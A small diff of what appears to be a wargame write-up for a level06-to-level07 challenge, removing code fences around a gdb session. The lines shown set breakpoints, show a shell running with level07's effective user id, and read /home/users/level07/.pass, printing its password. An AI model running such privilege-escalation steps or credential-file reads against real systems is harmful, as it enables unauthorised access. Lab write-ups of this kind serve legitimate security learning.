@@ -1,4 +1,3 @@
-```gdb
 (gdb) b *0x0804887c
 (gdb) b *0x08048863
 (gdb) start
@@ -51,4 +50,3 @@ $ id
 uid=1006(level06) gid=1006(level06) euid=1007(level07) egid=100(users) groups=1007(level07),100(users),1006(level06)
 $ cat /home/users/level07/.pass
 GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
-```
